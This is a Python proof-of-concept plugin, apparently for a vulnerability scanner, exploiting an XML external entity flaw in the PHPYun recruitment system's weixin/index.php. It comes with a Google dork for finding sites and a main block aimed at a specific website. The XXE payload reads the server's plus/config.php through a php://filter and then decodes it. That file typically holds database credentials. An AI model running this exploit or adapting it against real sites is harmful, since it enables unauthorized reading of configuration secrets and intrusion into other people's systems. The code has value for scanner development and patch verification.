#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: phpyun人才系统任意文件读取(XML实体注入)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-064637
description:
    weixin/index.php XML实体注入
    360主机卫士居然没检测出来...
google dork:
    powered by phpyun
'''

import base64
import re

def assign(service, arg):
    if service == 'phpyun':
        return True, arg

def audit(arg):
    url = arg + 'weixin/index.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709'
    content_type = 'Content-Type: text/xml'
    data = '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE copyright [
<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=../plus/config.php">
]>
<xml>
<ToUserName>&test;</ToUserName>
<FromUserName>1111</FromUserName>
<MsgType>123</MsgType>
<FuncFlag>3</FuncFlag>
<Content>1</Content>
</xml>'''
    code, head, res, err, _ = curl.curl2(url, post=data, header=content_type)
    if code != 200:
        return False;
    m = re.search(r'<FromUserName><!\[CDATA\[([a-zA-Z0-9/+=]*)\]\]>', res)
    if not m:
        return False
    config_file = base64.b64decode(m.group(1))
    if("<?php" in config_file) and ("?>" in config_file):
        security_hole('phpyun>>'+url+'>>refer http://www.wooyun.org/bugs/wooyun-2014-064637')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('phpyun', 'http://www.lijiangzp.com/')[1])